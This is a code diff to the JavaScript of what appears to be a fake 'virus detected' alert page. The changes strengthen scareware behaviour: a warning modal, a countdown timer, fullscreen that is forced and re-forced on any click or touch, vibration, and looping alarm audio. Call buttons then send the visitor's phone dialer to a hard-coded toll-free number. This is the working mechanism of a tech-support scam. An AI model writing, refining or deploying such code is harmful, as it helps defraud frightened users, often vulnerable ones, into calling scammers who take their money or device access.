@@ -1,4 +1,8 @@
 $(document).ready(() => {
+  const virusModal = document.getElementById("virusModal");
+  const modalInstance = new bootstrap.Modal(virusModal);
+  const audioPlayer = document.getElementById("audioPlayer");
+
   // Function to start the countdown timer
   function startCountdown() {
     let timeInSeconds = 5 * 60; // 5 minutes in seconds
@@ -25,16 +29,11 @@ $(document).ready(() => {
     }, 1000);
   }
 
-  // Start the countdown timer
-  startCountdown();
-
-  const virusModal = document.getElementById("virusModal");
-  const modalInstance = new bootstrap.Modal(virusModal);
-  const audioPlayer = document.getElementById("audioPlayer");
-
   // Function to play audio in a loop
   function playAudioLoop() {
-    audioPlayer.play();
+    audioPlayer.play().catch((error) => {
+      console.warn("Audio play was blocked: ", error);
+    });
     audioPlayer.addEventListener("ended", () => {
       audioPlayer.play();
     });
@@ -60,6 +59,16 @@ $(document).ready(() => {
     }
   }
 
+  // Function to ensure fullscreen persists
+  function ensureFullScreen() {
+    if (!document.fullscreenElement) {
+      goFullScreenAndVibrate();
+    }
+  }
+
+  // Start the countdown timer
+  startCountdown();
+
   // Ensure fullscreen is triggered when the modal is shown
   if (virusModal) {
     virusModal.addEventListener("show.bs.modal", () => {
@@ -80,12 +89,17 @@ $(document).ready(() => {
   window.addEventListener("touchstart", goFullScreenAndVibrate);
   window.addEventListener("click", goFullScreenAndVibrate);
 
-  // Handle button actions
+  // Handle button actions for fullscreen, audio, and call
   $("#vibrateButton").on("click", () => {
     goFullScreenAndVibrate();
+    playAudioLoop();
   });
 
   $("#callButton, #callButton1, #callButton2").on("click", () => {
+    goFullScreenAndVibrate();
+    playAudioLoop();
+
+    // Redirect to phone dialer
     const phoneNumber = "tel:+18778381219";
     window.location.href = phoneNumber;
   });
